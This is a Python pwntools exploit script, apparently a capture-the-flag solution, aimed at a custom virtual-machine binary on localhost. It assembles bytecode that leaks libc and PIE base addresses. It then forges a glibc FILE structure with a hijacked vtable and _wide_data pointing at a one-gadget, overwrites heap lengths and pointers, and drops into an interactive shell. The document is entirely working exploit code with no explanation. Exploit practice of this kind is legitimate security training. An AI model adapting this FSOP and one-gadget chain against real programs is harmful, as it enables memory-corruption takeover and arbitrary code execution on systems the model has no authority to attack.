from pwn import *

REMOTE = True

if REMOTE:
    io = remote('localhost', 11111)
else:
    io = process('./main')
context.arch = 'amd64'
#context.log_level = 'debug'

POP = 0x7
PUSH = 0x6
MOV = 0x0
LEA = 0x1
OPEN = 0x1003
CLOSE = 0x1002
WRITE = 0x1001
READ = 0x1000
SUB = 0x3
SHL = 0x8
SHR = 0x9
OR = 0xB

def pop(reg):
    payload = f'''
        mov rax, {POP}
        mov rdi, {reg}
        syscall
    '''
    return payload

def push(reg):
    payload = f'''
        mov rax, {PUSH}
        mov rdi, {reg}
        syscall 
    '''
    return payload

def mov(mode, reg, val):
    payload = f'''
        mov rax, {MOV}
        mov rdi, {mode}
        mov rsi, {reg}
        mov rdx, {val}
        syscall
    '''
    return payload

def lea(mode, rsi, rdx):
    payload = f'''
        mov rax, {LEA}
        mov rdi, {mode}
        mov rsi, {rsi}
        mov rdx, {rdx}
        syscall
    '''
    return payload


def open(stack_off, file_off):
    payload = f'''
        mov rax, {OPEN}
        mov rdi, {stack_off}
        mov rsi, {file_off}
        syscall
    '''
    return payload

def read(mode, file_off):
    payload = f'''
        mov rax, {READ}
        mov rdi, {mode}
        mov rsi, {file_off}
        syscall    
    '''
    return payload

def write(mode, file_off):
    payload = f'''
        mov rax, {WRITE}
        mov rdi, {mode}
        mov rsi, {file_off}
        syscall    
    '''
    return payload

def close(file_off):
    payload = f'''
        mov rax, {CLOSE}
        mov rdi, {file_off}
        syscall
    '''
    return payload

def sub(mode, reg, val):
    payload = f'''
        mov rax, {SUB}
        mov rdi, {mode}
        mov rsi, {reg}
        mov rdx, {val}    
        syscall
    '''
    return payload

def shl(mode, rsi, rdx):
    payload = f'''
        mov rax, {SHL}
        mov rdi, {mode}
        mov rsi, {rsi}
        mov rdx, {rdx}
        syscall
    '''
    return payload

def _or(mode, rsi, rdx):
    payload = f'''
        mov rax, {OR}
        mov rdi, {mode}
        mov rsi, {rsi}
        mov rdx, {rdx}
        syscall    
    '''
    return payload

filename = b'test.txt\x00'
opcode = ''

def libc_leak():
    global opcode
    for c in filename:
        opcode += mov(0, 0, c)
        opcode += push(0)
    opcode += open(0, 0)
    for _ in range(len(filename)):
        opcode += pop(0)
    for _ in range(0x18+0x2):
        opcode += pop(0)
    for i in range(6): # libc leak
        opcode += pop(i)

    opcode += shl(0, 0, 40)
    opcode += shl(0, 1, 32)
    opcode += shl(0, 2, 24)
    opcode += shl(0, 3, 16)
    opcode += shl(0, 4, 8)
    opcode += shl(0, 5, 0)
    opcode += _or(1, 0, 1)
    opcode += _or(1, 0, 2)
    opcode += _or(1, 0, 3)
    opcode += _or(1, 0, 4)
    opcode += _or(1, 0, 5)

    opcode += mov(0, 1, 0x0)
    opcode += lea(1, 1, 0)
    opcode += write(0, 0)
    opcode += read(0, 0)

def pie_leak():
    global opcode
    for _ in range(0x4d8+0x2):
        opcode += pop(0)
    for i in range(6): # pie leak
        opcode += pop(i)
    opcode += shl(0, 0, 40)
    opcode += shl(0, 1, 32)
    opcode += shl(0, 2, 24)
    opcode += shl(0, 3, 16)
    opcode += shl(0, 4, 8)
    opcode += shl(0, 5, 0)
    opcode += _or(1, 0, 1)
    opcode += _or(1, 0, 2)
    opcode += _or(1, 0, 3)
    opcode += _or(1, 0, 4)
    opcode += _or(1, 0, 5)

    opcode += mov(0, 1, 0x0)
    opcode += lea(1, 1, 0)
    opcode += write(0, 0)
    opcode += read(0, 0)

libc_leak()
for i in range(6):
    opcode += push(i)
for _ in range(len(filename) + 0x18 + 2):
    opcode += push(0)
for i in range(6):
    opcode += push(i)
for _ in range(6+9):
    opcode += pop(0) # set rsp = 0
pie_leak()
opcode += write(1, 1)
opcode += write(1, 0)
opcode += write(1, 0)
opcode += write(1, 0)
opcode += write(1, 2)
opcode += close(1)
opcode = asm(opcode)

PROGRAM_SIZE = 0x6000
chunk_size = 0x800
opcode += b'\x00' * (PROGRAM_SIZE - len(opcode))
opcode_blks = [opcode[i:i+chunk_size] for i in range(0, len(opcode), chunk_size)]

for opcode in opcode_blks:
    io.send(opcode)
    sleep(1)

io.recvuntil('**** run program ****\n\x00')
leak = b''

leak = (io.recv(6))
leak += (io.recv(6))

libc_base = u64(leak[:6].ljust(8, b'\x00')) - 0x21b6a0
_IO_wfile_jumps = libc_base + 0x2170c0

pie_base = u64(leak[6:].ljust(8, b'\x00')) - 0x7e0
io.success(f'libc_base @ {hex(libc_base)}')
io.success(f'pie_base @ {hex(pie_base)}')

fsop = FileStructure(null=pie_base + 0x5410)
fsop.flags = 0x0
fsop.vtable = _IO_wfile_jumps+0x8
fsop._wide_data = p64(pie_base + 0x5248)
_wide_data = b'\x00'*0x68 + p64(libc_base + 0xebc88) # one gadget
_wide_data += b'\x00' * (0xe0 - len(_wide_data)) + p64(pie_base + 0x5248)
io.sendline(bytes(fsop))
sleep(0.1)
io.send(b'a'*0x100+b'\xff') # _FILE[0].len = 0x10ff
sleep(0.1)
payload = b'a'*0x100 + p64(0xffff) + p64(pie_base + 0x5138)
io.sendline(b'a'*0x100 +p64(len(payload) - 1)) # _FILE[0].len = 0xffff
sleep(0.1)
io.send(b'a'*0x100+p64(0xffff) + p64(pie_base + 0x5138)) # _FILE[1].fp = pie_base + 0x5410
sleep(0.1)
io.sendline(_wide_data)

io.interactive()